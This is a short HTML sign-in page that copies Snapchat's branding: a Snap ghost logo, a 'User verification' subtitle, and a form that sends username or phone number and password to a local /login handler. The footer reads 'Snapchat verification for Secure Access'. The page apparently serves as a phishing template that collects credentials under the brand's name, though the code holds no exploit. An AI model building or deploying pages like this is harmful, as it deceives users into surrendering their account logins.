<link rel="stylesheet" href="/style.css">

<div class="container">

    <div class="logo-wrapper">
  <img src="/ghost.png" alt="Snap logo" class="snap-logo">
</div>

    <h1>Sign in</h1>
    <div class="subtext">User verification</div>

    <form action="/login" method="POST">
    <input type="text" id="usernameField" name="username" placeholder="Username or email address" required>
    <a href="#" onclick="toggleInput()" style="font-size:14px; display:block; margin:10px 0; text-align:left; color:#51a4fd; font-weight: bold;">Phone number instead</a>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Login</button>
</form>

<script>
let usingPhone = false;
function toggleInput() {
    const field = document.getElementById("usernameField");
    usingPhone = !usingPhone;
    if(usingPhone){
        field.placeholder = "Phone number";
        field.type = "tel";
    } else {
        field.placeholder = "Username or email address";
        field.type = "text";
    }
}
</script>


    <div class="small-text">Snapchat verification for  Secure Access</div>
</div>
